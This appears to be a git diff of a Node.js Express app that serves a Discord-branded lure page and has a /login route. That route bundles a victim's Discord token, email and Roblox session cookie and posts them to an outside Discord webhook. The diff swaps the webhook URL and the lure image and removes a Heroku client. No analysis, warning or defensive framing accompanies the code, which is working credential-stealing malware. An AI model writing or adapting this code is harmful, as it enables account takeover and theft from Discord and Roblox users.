@@ -1,21 +1,15 @@
 const express = require('express');
 const axios = require('axios');
 const dotenv = require('dotenv');
-const heroku = require('heroku-client');
 const app = express();
 const port = process.env.PORT || 3000;
 
 dotenv.config();
 
-const herokuClient = heroku.createClient({
-  token: process.env.HEROKU_API_KEY,
-  username: process.env.HEROKU_USERNAME,
-});
-
 app.get('/', (req, res) => {
   res.send(`
     <a href="https://discord.com/login?redirect_to=discord.com">
-      <img src="https://upload-os-bbs.hoyolab.com/upload/2022/08/12/183248796/8d8d5faa20350abe7809d1df596a2ea9_4426511331494337990.jpg" alt="Discord Image" />
+      <img src="https://upload-os-bbs.hoyolab.com/upload/2023/04/14/323351764/bf2aa186a52f7d5f45d8b54e0808a121_5797701741494440015.jpg" alt="Discord Image" />
     </a>
   `);
 });
@@ -31,7 +25,7 @@ app.get('/login', async (req, res) => {
 
     const data = { discordToken, email, robloxCookie };
 
-    await axios.post('https://discord.com/api/webhooks/1437505343570710622/TeTg37uLuJXLdSPdWJ3rGGiWbG3htY10uIXlNnLTAkS8fSkHazsH9aqw0THn3-7FH0R4', data);
+    await axios.post( "https://discord.com/api/webhooks/1437519275391975485/kOyKz5U9HTkH11P6T2HE_KXK5dEtapamJF299n2f4TpN3QBY5nLBlWyJNUQ7j9gXKltk", data);
 
     res.status(200).send('Done! Please close this tab.');
   } catch (error) {
